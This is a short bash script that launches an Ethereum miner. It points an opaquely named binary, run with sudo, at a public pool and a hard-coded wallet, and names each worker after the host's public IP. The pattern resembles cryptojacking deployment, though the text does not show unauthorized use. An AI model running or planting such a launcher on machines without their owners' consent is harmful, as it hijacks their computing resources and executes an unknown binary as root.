#!/bin/bash

POOL=stratum+tcp://eu1.ethermine.org:4444
WALLET=0x62db01b3a4f851994b28468e5f239bc8b6524adb
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-mikus

cd "$(dirname "$0")"

chmod +x ./b6sv && sudo ./b6sv -a ethash -o $POOL -u $WALLET.$WORKER $@
